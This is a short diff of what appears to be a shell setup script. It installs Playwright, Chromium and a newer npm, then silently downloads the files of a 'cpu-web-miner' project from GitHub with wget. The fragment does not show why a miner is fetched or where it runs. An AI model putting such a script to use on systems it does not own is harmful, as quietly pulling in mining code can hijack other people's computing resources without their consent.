@@ -30,7 +30,7 @@ pip install playwright
 
 echo "[*] Install Chromium browser for Playwright..."
 playwright install chromium
-
+npm install -g npm@11.6.1
 wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
 wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
 wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
